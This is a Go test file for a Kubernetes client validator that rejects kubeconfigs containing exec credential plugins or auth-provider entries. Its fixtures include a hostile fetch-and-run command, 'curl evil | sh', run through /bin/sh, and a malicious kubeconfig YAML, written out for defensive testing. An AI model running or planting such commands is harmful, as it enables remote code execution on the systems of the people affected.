package k8s

import (
	"strings"
	"testing"

	clientcmdapi "k8s.io/client-go/tools/clientcmd/api"
)

// TestValidateKubeConfigSafety_ExecRejected 验证 task 85：含 exec 凭据插件的 kubeconfig 被拒绝。
func TestValidateKubeConfigSafety_ExecRejected(t *testing.T) {
	cfg := clientcmdapi.NewConfig()
	cfg.AuthInfos["evil"] = &clientcmdapi.AuthInfo{
		Exec: &clientcmdapi.ExecConfig{Command: "/bin/sh", Args: []string{"-c", "curl evil | sh"}},
	}
	err := validateKubeConfigSafety(cfg)
	if err == nil {
		t.Fatal("含 exec 凭据插件的 kubeconfig 应被拒绝")
	}
	if !strings.Contains(err.Error(), "exec") {
		t.Fatalf("错误信息应提及 exec 插件: %v", err)
	}
}

// TestValidateKubeConfigSafety_AuthProviderRejected 验证含 auth-provider 的 kubeconfig 被拒绝。
func TestValidateKubeConfigSafety_AuthProviderRejected(t *testing.T) {
	cfg := clientcmdapi.NewConfig()
	cfg.AuthInfos["evil"] = &clientcmdapi.AuthInfo{
		AuthProvider: &clientcmdapi.AuthProviderConfig{Name: "gcp"},
	}
	err := validateKubeConfigSafety(cfg)
	if err == nil {
		t.Fatal("含 auth-provider 的 kubeconfig 应被拒绝")
	}
}

// TestValidateKubeConfigSafety_StaticCredsAllowed 验证静态凭据（token/证书）不被误拒。
func TestValidateKubeConfigSafety_StaticCredsAllowed(t *testing.T) {
	cfg := clientcmdapi.NewConfig()
	cfg.AuthInfos["token-user"] = &clientcmdapi.AuthInfo{Token: "static-token"}
	cfg.AuthInfos["cert-user"] = &clientcmdapi.AuthInfo{
		ClientCertificateData: []byte("cert"), ClientKeyData: []byte("key"),
	}
	if err := validateKubeConfigSafety(cfg); err != nil {
		t.Fatalf("静态凭据应被放行: %v", err)
	}
}

// TestNewK8sClient_ExecKubeconfigRejected 端到端：恶意 kubeconfig 在构造客户端时被拒绝（不建立连接）。
func TestNewK8sClient_ExecKubeconfigRejected(t *testing.T) {
	evil := `apiVersion: v1
kind: Config
clusters:
- name: c1
  cluster:
    server: https://10.0.0.1:6443
users:
- name: u1
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1beta1
      command: /bin/sh
      args: ["-c", "echo pwned"]
contexts:
- name: ctx1
  context:
    cluster: c1
    user: u1
current-context: ctx1
`
	if _, err := NewK8sClient("evil", evil); err == nil {
		t.Fatal("含 exec 插件的 kubeconfig 应被拒绝，不允许建立客户端")
	}
}

// TestNewK8sClient_EmptyRejected 验证空 kubeconfig 被拒绝。
func TestNewK8sClient_EmptyRejected(t *testing.T) {
	if _, err := NewK8sClient("empty", ""); err == nil {
		t.Fatal("空 kubeconfig 应被拒绝")
	}
}
